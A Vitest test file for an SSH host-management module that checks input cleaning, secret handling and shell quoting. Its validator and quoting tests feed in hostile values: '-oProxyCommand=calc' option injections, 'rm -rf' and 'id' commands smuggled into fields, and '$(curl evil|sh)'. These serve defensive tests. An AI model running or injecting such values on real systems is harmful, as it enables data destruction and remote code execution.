import { describe, it, expect } from 'vitest'
import {
  mergeSecrets,
  cleanHostFields,
  cleanHostText,
  cleanTags,
  cleanNotes,
  decodeHostsFile,
  hasControlChars,
  hostFieldProblem,
  hostFieldProblemKey,
  isSafeSshHost,
  isSafeSshUsername,
  quotePosix,
  remoteCommandWord,
  sshDestinationArgs,
  DEFAULT_ELEVATE_COMMAND,
  PUBLIC_HOST_FIELDS,
  SECRET_FIELDS,
  effectiveElevation,
  elevateCommandFor,
  stripSecrets,
  toPublicHost,
  type SshHost
} from './ssh-host-pure'
import { makeT } from '../shared/i18n'

describe('cleanHostText', () => {
  it('trims surrounding whitespace', () => {
    expect(cleanHostText('  192.168.1.10 \t')).toBe('192.168.1.10')
  })

  it('strips a trailing non-breaking space and a BOM', () => {
    expect(cleanHostText('192.168.1.10\u00a0')).toBe('192.168.1.10')
    expect(cleanHostText('\ufeffjdl')).toBe('jdl')
  })

  it('strips zero-width characters, which trim() keeps', () => {
    expect(cleanHostText('192.168.1.10\u200b')).toBe('192.168.1.10')
    expect(cleanHostText('pve\u200c-\u200d01\u2060')).toBe('pve-01')
  })

  it('keeps inner spaces', () => {
    expect(cleanHostText(' my server ')).toBe('my server')
  })
})

describe('cleanHostFields', () => {
  it('drops an elevation mode or command that is not on the list, keeps a known one', () => {
    const base = { name: 'n', host: 'h', username: 'u' }
    const bad = cleanHostFields({ ...base, elevation: 'root', elevateCommand: 'sudo -i; id' })
    expect(bad).not.toHaveProperty('elevation')
    expect(bad).not.toHaveProperty('elevateCommand')
    expect(cleanHostFields({ ...base, elevation: 'other', elevateCommand: 'su -' })).toMatchObject({ elevation: 'other', elevateCommand: 'su -' })
  })

  const base = { id: 'ssh_1', name: ' pve-01 ', host: '192.168.1.10 ', port: 22, username: 'jdl\u200b', authType: 'key' as const }

  it('cleans name, host and username', () => {
    const out = cleanHostFields(base)
    expect(out.name).toBe('pve-01')
    expect(out.host).toBe('192.168.1.10')
    expect(out.username).toBe('jdl')
  })

  it('cleans the optional path fields only when present', () => {
    const out = cleanHostFields({ ...base, privateKeyPath: ' C:\\k\\id ', remotePath: '/srv ' })
    expect(out.privateKeyPath).toBe('C:\\k\\id')
    expect(out.remotePath).toBe('/srv')
    expect('claudePath' in out).toBe(false)
  })

  it('leaves secrets and unrelated fields untouched', () => {
    const out = cleanHostFields({ ...base, password: ' keep me ', passphrase: ' too ' })
    expect(out.password).toBe(' keep me ')
    expect(out.passphrase).toBe(' too ')
    expect(out.port).toBe(22)
    expect(out.id).toBe('ssh_1')
  })
})

describe('decodeHostsFile', () => {
  const hosts = [{ id: 'ssh_1', name: 'pve-01' }]
  const json = JSON.stringify(hosts)
  // A stand-in for safeStorage: "encrypted" bytes are the JSON behind a marker.
  const MARK = 'ENC:'
  const encrypt = (s: string): Buffer => Buffer.from(MARK + s, 'utf-8')
  const decrypt = (b: Buffer): string => {
    const s = b.toString('utf-8')
    if (!s.startsWith(MARK)) throw new Error('Error while decrypting the ciphertext provided to safeStorage.decryptString.')
    return s.slice(MARK.length)
  }
  const unavailable = (): string => {
    throw new Error('Encryption is not available.')
  }

  it('reads an encrypted file while encryption is available', () => {
    expect(decodeHostsFile(encrypt(json), { encryptionAvailable: true, decrypt })).toEqual({ ok: true, hosts })
  })

  it('reads a plaintext file while encryption is unavailable', () => {
    expect(decodeHostsFile(Buffer.from(json), { encryptionAvailable: false, decrypt: unavailable })).toEqual({ ok: true, hosts })
  })

  it('falls back to plaintext when a plaintext file meets available encryption', () => {
    expect(decodeHostsFile(Buffer.from(json), { encryptionAvailable: true, decrypt })).toEqual({ ok: true, hosts })
  })

  it('falls back to decrypting when an encrypted file meets unavailable encryption', () => {
    expect(decodeHostsFile(encrypt(json), { encryptionAvailable: false, decrypt })).toEqual({ ok: true, hosts })
  })

  it('reads an empty list as an empty list', () => {
    expect(decodeHostsFile(encrypt('[]'), { encryptionAvailable: true, decrypt })).toEqual({ ok: true, hosts: [] })
  })

  it('is an error, not an empty list, when neither mode decodes', () => {
    const res = decodeHostsFile(Buffer.from([0x01, 0x02, 0xff]), { encryptionAvailable: true, decrypt })
    expect(res.ok).toBe(false)
    if (!res.ok) {
      expect(res.error).toMatch(/^encrypted: .*decrypting.*; plaintext: /)
    }
  })

  it('is an error when the file decodes to something other than a list', () => {
    const res = decodeHostsFile(encrypt('{"id":"ssh_1"}'), { encryptionAvailable: true, decrypt })
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toContain('not a list of hosts')
  })

  it('is an error for an empty (truncated) file', () => {
    expect(decodeHostsFile(Buffer.alloc(0), { encryptionAvailable: false, decrypt: unavailable }).ok).toBe(false)
  })
})

describe('mergeSecrets', () => {
  const prev = { password: 'old', passphrase: 'oldpp' }
  it('keeps the stored secret when undefined or empty', () => {
    expect(mergeSecrets(prev, { authType: 'password' })).toEqual({ password: 'old' })
    expect(mergeSecrets(prev, { authType: 'password', password: '' })).toEqual({ password: 'old' })
    expect(mergeSecrets(prev, { authType: 'key' })).toEqual({ passphrase: 'oldpp' })
  })
  it('clears on null', () => {
    expect(mergeSecrets(prev, { authType: 'password', password: null })).toEqual({})
    expect(mergeSecrets(prev, { authType: 'key', passphrase: null })).toEqual({})
  })
  it('replaces with a non-empty string', () => {
    expect(mergeSecrets(prev, { authType: 'password', password: 'new' })).toEqual({ password: 'new' })
    expect(mergeSecrets(undefined, { authType: 'key', passphrase: 'x' })).toEqual({ passphrase: 'x' })
  })
  it('drops the secret the auth type does not use', () => {
    expect(mergeSecrets(prev, { authType: 'agent' })).toEqual({})
    expect(mergeSecrets(prev, { authType: 'key', password: 'typed' })).toEqual({ passphrase: 'oldpp' })
  })
})

describe('mergeSecrets, elevation password', () => {
  const prev = { password: 'old', elevationPassword: 'root-pw' }
  it('keeps the stored one when undefined or empty', () => {
    expect(mergeSecrets(prev, { authType: 'agent', elevation: 'other' })).toEqual({ elevationPassword: 'root-pw' })
    expect(mergeSecrets(prev, { authType: 'agent', elevation: 'other', elevationPassword: '' })).toEqual({ elevationPassword: 'root-pw' })
  })
  it('clears on null and replaces with a non-empty string', () => {
    expect(mergeSecrets(prev, { authType: 'agent', elevation: 'other', elevationPassword: null })).toEqual({})
    expect(mergeSecrets(prev, { authType: 'agent', elevation: 'other', elevationPassword: 'new' })).toEqual({ elevationPassword: 'new' })
    expect(mergeSecrets(undefined, { authType: 'key', elevation: 'other', elevationPassword: 'x' })).toEqual({ elevationPassword: 'x' })
  })
  it('drops it when the mode is not other', () => {
    for (const elevation of ['login', 'none', undefined, 'bogus']) {
      expect(mergeSecrets(prev, { authType: 'agent', elevation, elevationPassword: 'typed' })).toEqual({})
    }
    expect(mergeSecrets(prev, { authType: 'password', elevation: 'login' })).toEqual({ password: 'old' })
  })
  it('survives switching the auth type', () => {
    expect(mergeSecrets(prev, { authType: 'password', elevation: 'other' })).toEqual({ password: 'old', elevationPassword: 'root-pw' })
    expect(mergeSecrets(prev, { authType: 'key', elevation: 'other' })).toEqual({ elevationPassword: 'root-pw' })
    expect(mergeSecrets(prev, { authType: 'agent', elevation: 'other' })).toEqual({ elevationPassword: 'root-pw' })
  })
  it('leaves the login password and passphrase rules as they were', () => {
    const all = { password: 'pw', passphrase: 'pp', elevationPassword: 'ep' }
    expect(mergeSecrets(all, { authType: 'key', elevation: 'other' })).toEqual({ passphrase: 'pp', elevationPassword: 'ep' })
    expect(mergeSecrets(all, { authType: 'password', elevation: 'none', password: null })).toEqual({})
  })
})

describe('host secrets allowlist', () => {
  // Required<SshHost>: a field added to SshHost makes this literal fail the typecheck
  // until it is listed here, and the assertions below then check where it ended up.
  const full: Required<SshHost> = {
    id: 'h1',
    name: 'n',
    host: 'h',
    port: 22,
    username: 'u',
    authType: 'password',
    password: 'pw',
    privateKeyPath: '/k',
    passphrase: 'pp',
    remotePath: '/r',
    claudePath: 'claude',
    elevation: 'other',
    elevationPassword: 'ep',
    elevateCommand: 'su -',
    favorite: true,
    production: true,
    tags: ['prod'],
    notes: 'n',
    credentialId: 'cred_1'
  }

  it('keeps the public and secret field lists disjoint and covering every host field', () => {
    const pub = new Set<string>(PUBLIC_HOST_FIELDS)
    for (const k of SECRET_FIELDS) expect(pub.has(k), k).toBe(false)
    for (const k of Object.keys(full)) {
      expect(pub.has(k) || (SECRET_FIELDS as readonly string[]).includes(k), k).toBe(true)
    }
  })

  it('gives the renderer no secret, only the allowlisted fields and flags', () => {
    const pub = toPublicHost(full)
    for (const k of SECRET_FIELDS) expect(pub).not.toHaveProperty(k)
    const allowed = new Set<string>([...PUBLIC_HOST_FIELDS, 'hasPassword', 'hasPassphrase', 'hasElevation'])
    for (const k of Object.keys(pub)) expect(allowed.has(k), k).toBe(true)
    for (const v of Object.values(pub)) {
      for (const secret of ['pw', 'pp', 'ep']) expect(v).not.toBe(secret)
    }
    expect(pub).toMatchObject({ hasPassword: true, hasPassphrase: true, hasElevation: true, elevateCommand: 'su -' })
  })

  it('drops a field it does not know, even one smuggled in at runtime', () => {
    const pub = toPublicHost({ ...full, token: 'secret' } as unknown as SshHost)
    expect(pub).not.toHaveProperty('token')
  })

  it('drops an off-list elevation mode or command (a host that skipped cleanHostFields)', () => {
    const pub = toPublicHost({ ...full, elevation: 'root', elevateCommand: 'sudo -i; id' } as unknown as SshHost)
    expect(pub).not.toHaveProperty('elevation')
    expect(pub).not.toHaveProperty('elevateCommand')
  })

  it('stripSecrets removes every secret field', () => {
    const out = stripSecrets(full)
    for (const k of SECRET_FIELDS) expect(out).not.toHaveProperty(k)
    expect(out).toHaveProperty('elevation', 'other')
  })

  it('hasElevation: login needs a password host with one, other needs the elevation password', () => {
    const base = { id: 'h', name: 'n', host: 'h', port: 22, username: 'u' }
    expect(toPublicHost({ ...base, authType: 'password', password: 'pw' }).hasElevation).toBe(true)
    expect(toPublicHost({ ...base, authType: 'password' }).hasElevation).toBe(false)
    expect(toPublicHost({ ...base, authType: 'password', password: 'pw', elevation: 'none' }).hasElevation).toBe(false)
    expect(toPublicHost({ ...base, authType: 'key', elevation: 'login' }).hasElevation).toBe(false)
    expect(toPublicHost({ ...base, authType: 'key', elevation: 'other' }).hasElevation).toBe(false)
    expect(toPublicHost({ ...base, authType: 'agent', elevation: 'other', elevationPassword: 'ep' }).hasElevation).toBe(true)
    expect(toPublicHost({ ...base, authType: 'password', password: 'pw', elevation: 'other' }).hasElevation).toBe(false)
  })
})

describe('effectiveElevation / elevateCommandFor', () => {
  it('defaults to login for password hosts and none otherwise', () => {
    expect(effectiveElevation({ authType: 'password' })).toBe('login')
    expect(effectiveElevation({ authType: 'key' })).toBe('none')
    expect(effectiveElevation({ authType: 'agent', elevation: 'bogus' })).toBe('none')
  })
  it('treats login on a host without a login password as none', () => {
    expect(effectiveElevation({ authType: 'key', elevation: 'login' })).toBe('none')
    expect(effectiveElevation({ authType: 'agent', elevation: 'other' })).toBe('other')
  })
  it('falls back to the default command for anything off the list', () => {
    expect(elevateCommandFor({})).toBe(DEFAULT_ELEVATE_COMMAND)
    expect(elevateCommandFor({ elevateCommand: 'sudo su -' })).toBe('sudo su -')
    expect(elevateCommandFor({ elevateCommand: 'sudo -i; rm -rf /' })).toBe(DEFAULT_ELEVATE_COMMAND)
  })
})

describe('isSafeSshUsername', () => {
  it('accepts ordinary and directory login names', () => {
    for (const u of ['root', 'jdl', 'deploy-bot', 'svc_app', 'a.b', '1000', 'joao@corp.example', 'CORP\\joao', 'HOST$']) {
      expect(isSafeSshUsername(u), u).toBe(true)
    }
  })

  it('refuses option-like, empty, spaced, control and shell-special names', () => {
    for (const u of ['', '-oProxyCommand=calc', '-l', 'a b', 'a\tb', 'root\n', 'a\u0000b', "o'neil", 'a;b', 'a`id`', '$(id)', 'a|b', 'joão', 'x'.repeat(257)]) {
      expect(isSafeSshUsername(u), JSON.stringify(u)).toBe(false)
    }
  })
})

describe('isSafeSshHost', () => {
  it('accepts hostnames, IPv4 and IPv6 (bare, bracketed, with a zone)', () => {
    for (const h of ['pve-01', 'srv.example.com', 'srv.example.com.', 'my_host.lan', '192.168.1.10', '::1', 'fe80::1%eth0', '[2001:db8::1]', '2001:db8::1']) {
      expect(isSafeSshHost(h), h).toBe(true)
    }
  })

  it('refuses option-like, spaced, control and malformed hosts', () => {
    for (const h of ['', '-oProxyCommand=calc.exe', '-p', 'a b', 'host\n', 'host\u0007', 'a..b', 'host-', '-host', 'a.-b', 'user@host', 'host;id', '$(id)', '[::1', 'fe80::1%eth0;id', 'x'.repeat(254)]) {
      expect(isSafeSshHost(h), JSON.stringify(h)).toBe(false)
    }
  })
})

describe('hasControlChars', () => {
  it('finds C0, DEL and C1 controls', () => {
    expect(hasControlChars('/srv/app')).toBe(false)
    expect(hasControlChars('/srv/my app')).toBe(false)
    for (const s of ['a\nb', 'a\rb', '\u0003', 'a\u007f', 'a\u009b']) expect(hasControlChars(s)).toBe(true)
  })
})

describe('hostFieldProblem', () => {
  const ok = { host: 'srv.lan', username: 'root' }

  it('is null for a usable host', () => {
    expect(hostFieldProblem(ok)).toBeNull()
    expect(hostFieldProblem({ ...ok, remotePath: "/srv/o'neil app", claudePath: '~/.local/bin/claude' })).toBeNull()
  })

  it('names the first bad field', () => {
    expect(hostFieldProblem({ ...ok, username: '-oProxyCommand=x' })).toBe('username')
    expect(hostFieldProblem({ ...ok, host: '-oProxyCommand=x' })).toBe('host')
    expect(hostFieldProblem({ ...ok, remotePath: '/srv\u0003touch /tmp/x\r' })).toBe('remotePath')
    expect(hostFieldProblem({ ...ok, claudePath: 'claude\nrm -rf ~' })).toBe('claudePath')
  })

  it('maps to a key both dictionaries carry', () => {
    const tEn = makeT('en')
    const tPt = makeT('pt-PT')
    for (const p of ['username', 'host', 'remotePath', 'claudePath'] as const) {
      const key = hostFieldProblemKey(p)
      expect(tEn(key)).not.toBe(key)
      expect(tPt(key)).not.toBe(key)
    }
  })
})

describe('sshDestinationArgs', () => {
  it('ends the options with -- before user@host', () => {
    expect(sshDestinationArgs('root', 'srv.lan')).toEqual(['--', 'root@srv.lan'])
    expect(sshDestinationArgs('joao@corp.example', '10.0.0.5')).toEqual(['--', 'joao@corp.example@10.0.0.5'])
  })

  it('refuses a hostile user or host', () => {
    expect(sshDestinationArgs('-oProxyCommand=calc', 'srv')).toBeNull()
    expect(sshDestinationArgs('root', '-oProxyCommand=calc')).toBeNull()
    expect(sshDestinationArgs('root', 'srv -oProxyCommand=calc')).toBeNull()
  })
})

describe('quotePosix / remoteCommandWord', () => {
  it('single-quotes and escapes embedded quotes', () => {
    expect(quotePosix('claude')).toBe("'claude'")
    expect(quotePosix("it's")).toBe("'it'\\''s'")
  })

  it('keeps metacharacters inert', () => {
    expect(remoteCommandWord('claude; rm -rf ~')).toBe("'claude; rm -rf ~'")
    expect(remoteCommandWord('$(curl evil|sh)')).toBe("'$(curl evil|sh)'")
    expect(remoteCommandWord("/opt/x'; id; echo '")).toBe("'/opt/x'\\''; id; echo '\\'''")
    expect(remoteCommandWord('/usr/local/bin/claude')).toBe("'/usr/local/bin/claude'")
  })

  it('leaves a leading ~/ unquoted so the remote shell still expands it', () => {
    expect(remoteCommandWord('~/.local/bin/claude')).toBe("~/'.local/bin/claude'")
    expect(remoteCommandWord('~/a b/$(id)')).toBe("~/'a b/$(id)'")
    expect(remoteCommandWord('~root/claude')).toBe("'~root/claude'")
  })
})

describe('cleanTags', () => {
  it('trims, drops empty ones and removes duplicates ignoring case', () => {
    expect(cleanTags([' prod ', '', '  ', 'Prod', 'db'])).toEqual(['prod', 'db'])
  })

  it('drops characters outside letters, digits, space and - _ . without failing', () => {
    expect(cleanTags(['a;b', 'x/y$z', 'ok-1_2.3 x', 'é ñ'])).toEqual(['ab', 'xyz', 'ok-1_2.3 x', 'é ñ'])
    expect(cleanTags(['<>', '!!!'])).toEqual([])
  })

  it('caps a tag at 32 characters and the list at 12', () => {
    expect(cleanTags(['x'.repeat(50)])[0]).toHaveLength(32)
    const many = Array.from({ length: 20 }, (_, i) => `t${i}`)
    expect(cleanTags(many)).toHaveLength(12)
  })

  it('ignores anything that is not a list of strings', () => {
    expect(cleanTags('prod')).toEqual([])
    expect(cleanTags([1, null, 'ok'])).toEqual(['ok'])
  })
})

describe('cleanNotes', () => {
  it('trims and caps at 20000 characters', () => {
    expect(cleanNotes('  hello \n')).toBe('hello')
    expect(cleanNotes('a'.repeat(30000))).toHaveLength(20000)
    expect(cleanNotes(42)).toBe('')
  })
})

describe('cleanHostFields, organisation fields', () => {
  const base = { name: 'n', host: 'h', username: 'u' }
  it('cleans tags and notes, and drops them when empty', () => {
    const out = cleanHostFields({ ...base, tags: [' a ', 'A', 'b;'], notes: '  x  ' })
    expect(out.tags).toEqual(['a', 'b'])
    expect(out.notes).toBe('x')
    const empty = cleanHostFields({ ...base, tags: ['!!'], notes: '   ' })
    expect('tags' in empty).toBe(false)
    expect('notes' in empty).toBe(false)
  })

  it('reaches the renderer through toPublicHost', () => {
    const pub = toPublicHost({
      id: 'i', ...base, port: 22, authType: 'agent', favorite: true, production: true, tags: ['a'], notes: 'n'
    })
    expect(pub).toMatchObject({ favorite: true, production: true, tags: ['a'], notes: 'n' })
  })
})
